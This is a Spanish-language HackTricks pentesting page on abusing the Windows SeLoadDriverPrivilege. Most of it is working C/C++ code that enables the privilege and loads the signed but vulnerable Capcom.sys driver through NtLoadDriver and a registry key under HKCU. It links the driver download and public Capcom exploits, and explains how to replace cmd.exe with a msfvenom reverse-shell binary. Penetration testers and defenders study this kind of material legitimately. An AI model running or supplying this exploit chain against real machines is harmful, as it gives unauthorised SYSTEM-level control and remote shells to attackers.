# Abuso de SeLoadDriverPrivilege

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

Un privilegio muy peligroso de asignar a cualquier usuario, ya que le permite cargar controladores de kernel y ejecutar código con privilegios de kernel, es decir, `NT\System`. Observa cómo el usuario `offense\spotless` tiene este privilegio:

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` muestra que el privilegio está deshabilitado de forma predeterminada:

![](../../../.gitbook/assets/a9.png)

Sin embargo, el siguiente código permite habilitar ese privilegio de manera bastante sencilla:

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

system("cmd");
return 0;
}
```
{% endcode %}

Compilamos lo anterior, ejecutamos y el privilegio `SeLoadDriverPrivilege` ahora está habilitado:

![](../../../.gitbook/assets/a10.png)

### Exploit del controlador Capcom.sys <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

Para demostrar aún más que el `SeLoadDriverPrivilege` es peligroso, vamos a **explotarlo para elevar privilegios**.

Puedes cargar un nuevo controlador usando **NTLoadDriver:**
```cpp
NTSTATUS NTLoadDriver(
_In_ PUNICODE_STRING DriverServiceName
);
```
Por defecto, el nombre del servicio del controlador debe estar en `\Registry\Machine\System\CurrentControlSet\Services\`

Sin embargo, según la **documentación**, también **podrías** utilizar rutas bajo **HKEY\_CURRENT\_USER**, lo que te permitiría **modificar** un **registro** para **cargar controladores arbitrarios** en el sistema.\
Los parámetros relevantes que deben definirse en el nuevo registro son:

* **ImagePath:** Valor de tipo REG\_EXPAND\_SZ que especifica la ruta del controlador. En este contexto, la ruta debe ser un directorio con permisos de modificación por parte del usuario no privilegiado.
* **Type:** Valor de tipo REG\_WORD en el que se indica el tipo de servicio. Para nuestro propósito, el valor debe definirse como SERVICE\_KERNEL\_DRIVER (0x00000001).

Por lo tanto, podrías crear un nuevo registro en **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** indicando en **ImagePath** la ruta al controlador y en **Type** el valor 1, y utilizar esos valores en el exploit (puedes obtener el SID del usuario usando: `Get-ADUser -Identity 'NOMBRE_USUARIO' | select SID` o `(New-Object System.Security.Principal.NTAccount("NOMBRE_USUARIO")).Translate([System.Security.Principal.SecurityIdentifier]).value`
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
El primero declara una variable de cadena indicando dónde se encuentra el controlador vulnerable **Capcom.sys** en el sistema de la víctima y el segundo es una variable de cadena que indica un nombre de servicio que se utilizará (podría ser cualquier servicio).\
Ten en cuenta que el **controlador debe estar firmado por Windows** por lo que no puedes cargar controladores arbitrarios. Sin embargo, **Capcom.sys** **puede ser abusado para ejecutar código arbitrario y está firmado por Windows**, por lo que el objetivo es cargar este controlador y explotarlo.

Cargar el controlador:
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

//system("cmd");
// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
std::cout << "[+] Set Registry Keys" << std::endl;
NTSTATUS st1;
UNICODE_STRING pPath;
UNICODE_STRING pPathReg;
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
HMODULE hObsolete = GetModuleHandleA(NTDLL);
*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

RtlInitUnicodeString(&pPath, pPathSource);
RtlInitUnicodeString(&pPathReg, pPathSourceReg);
st1 = NtLoadDriver(&pPathReg);
std::cout << "[+] value of st1: " << st1 << "\n";
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver Loaded as Kernel..\n";
std::cout << "[+] Press [ENTER] to unload driver\n";
}

getchar();
st1 = NtUnloadDriver(&pPathReg);
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver unloaded from Kernel..\n";
std::cout << "[+] Press [ENTER] to exit\n";
getchar();
}

return 0;
}
```
Una vez que el código anterior se compila y se ejecuta, podemos ver que nuestro controlador malicioso `Capcom.sys` se carga en el sistema víctima:

![](../../../.gitbook/assets/a11.png)

Descarga: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**Ahora es el momento de abusar del controlador cargado para ejecutar código arbitrario.**

Puedes descargar exploits desde [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) y [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) y ejecutarlo en el sistema para elevar nuestros privilegios a `NT Authority\System`:

![](../../../.gitbook/assets/a12.png)

### Sin interfaz gráfica

Si **no tenemos acceso a la GUI** del objetivo, tendremos que modificar el código **`ExploitCapcom.cpp`** antes de compilarlo. Aquí podemos editar la línea 292 y reemplazar `C:\\Windows\\system32\\cmd.exe"` con, por ejemplo, un binario de shell inversa creado con `msfvenom`, por ejemplo: `c:\ProgramData\revshell.exe`.

Código: c
```c
// Launches a command shell process
static bool LaunchShell()
{
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
PROCESS_INFORMATION ProcessInfo;
STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
&ProcessInfo))
{
return false;
}

CloseHandle(ProcessInfo.hThread);
CloseHandle(ProcessInfo.hProcess);
return true;
}
```
El string `CommandLine` en este ejemplo se cambiaría a:

Código: c
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
### Automático

Puedes usar [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) para **habilitar automáticamente** el **privilegio**, **crear** la **clave del registro** bajo HKEY\_CURRENT\_USER y **ejecutar NTLoadDriver** indicando la clave del registro que deseas crear y la ruta al controlador:

![](<../../../.gitbook/assets/image (289).png>)

Luego, necesitarás descargar un exploit **Capcom.sys** y usarlo para escalar privilegios.
